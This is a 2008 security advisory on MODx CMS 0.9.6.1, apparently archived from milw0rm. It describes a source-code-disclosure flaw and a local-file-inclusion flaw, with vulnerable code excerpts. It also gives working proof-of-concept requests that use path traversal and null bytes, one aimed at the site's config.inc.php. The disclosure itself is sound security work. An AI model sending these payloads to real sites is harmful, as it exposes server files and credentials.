@@ -1,0 +1,107 @@
+########################## WwW.BugReport.ir #########################
+#
+#      AmnPardaz Security Research Team
+#
+# Title: MODx CMS Vulnerabilities
+# Vendor: http://modxcms.com
+# Bugs: Source code disclosure, local file inclusion
+# Vulnerable Version: 0.9.6.1 (prior versions also may be affected)
+# Exploitation: Remote with browser
+# Fix Available: No!
+################################################################
+
+
+####################
+- Description:
+####################
+
+quote from vendor: "MODx is an open source PHP Application Framework that helps you take control of your online content.
+It empowers developers and advanced users to give as much control as desired to whomever they desire for day-to-day website content maintenance chores."
+
+
+####################
+- Vulnerability:
+####################
+
++--> source code disclosure
+
+Code Snippet:
+
+/assets/js/htcmime.php Line#18-36
+
+$fname = (array_key_exists("file", $_GET)) ? $_GET["file"] : ""; 
+
+// basename() also strips \x00, we don't need to worry about ? and # in path:
+// Must be real files anyway, fopen() does not support wildcards
+$ext = array_pop(explode('.', basename($fname)));
+if (strcasecmp($ext, "htc") != 0 || !file_exists($fname))
+  exit ("No file specified, file not found or illegal file.");
+
+$flen = filesize($fname);
+
+header("Content-type: text/x-component");
+header("Content-Length: ".$flen);
+header("Content-Disposition: inline; filename=$fname");
+
+$fp = fopen($fname, "r");
+
+echo fread($fp, $flen);
+
+fclose($fp);
+
+[as developer comments out] When magic_quotes_gpc is disabled, its possible to bypass extension check via null character injection 
+( because of null terminating behavior in any function that uses fopen_wrappers ) which could result in source code disclosure!
+
+POC : http://localhost/modx-0.9.6.1/assets/js/htcmime.php?file=../../manager/includes/config.inc.php%00.htc
+
+
++-->Local file inclusion
+
+Code Snippet:
+
+/assets/snippets/AjaxSearch/AjaxSearch.php line#17-41
+
+$stripHTML = $_POST['stripHTML'];
+$stripSnip = $_POST['stripSnip'];
+$stripSnippets = $_POST['stripSnippets'];
+$useAllWords = $_POST['useAllWords'];
+$searchStyle = $_POST['searchStyle'];
+$minChars = $_POST['minChars'];
+$maxResults = $_POST['maxResults'];
+$showMoreResults = $_POST['showMoreResults'];
+$moreResultsPage = $_POST['moreResultsPage'];
+$as_language = $_POST['as_language'];
+$extract = $_POST['extract'];
+$docgrp = $_POST['docgrp'];
+$highlightResult = $_POST['highlightResult'];
+
+include_once MODX_BASE_PATH . 'assets/snippets/AjaxSearch/includes/AjaxSearch.inc.php';
+include MODX_BASE_PATH . 'assets/snippets/AjaxSearch/includes/templates.inc.php';
+
+#include default language file
+include(MODX_BASE_PATH . "assets/snippets/AjaxSearch/lang/english.inc.php");
+
+#include other language file if set.
+if($as_language!="english" && $as_language != '') {
+	if(file_exists(MODX_BASE_PATH . "assets/snippets/AjaxSearch/lang/".$as_language.".inc.php"))
+		include MODX_BASE_PATH . "assets/snippets/AjaxSearch/lang/".$as_language.".inc.php";
+}
+
+There is no input validation here therefore its possible to set  $as_language which could result in local file inclusion!
+
+POC:
+Method=POST
+Action=http://localhost/modx-0.9.6.1/index-ajax.php?
+Name=as_language Value=../ajaxSearch_readme.txt%00
+Name=q Value=assets/snippets/AjaxSearch/AjaxSearch.php
+
+####################
+- Credit :
+####################
+Original Advisory:http://www.bugreport.ir/?/25
+AmnPardaz Security Research Team
+Contact: admin[4t}bugreport{d0t]ir
+WwW.BugReport.ir
+WwW.AmnPardaz.com
+
+# milw0rm.com [2008-01-05]
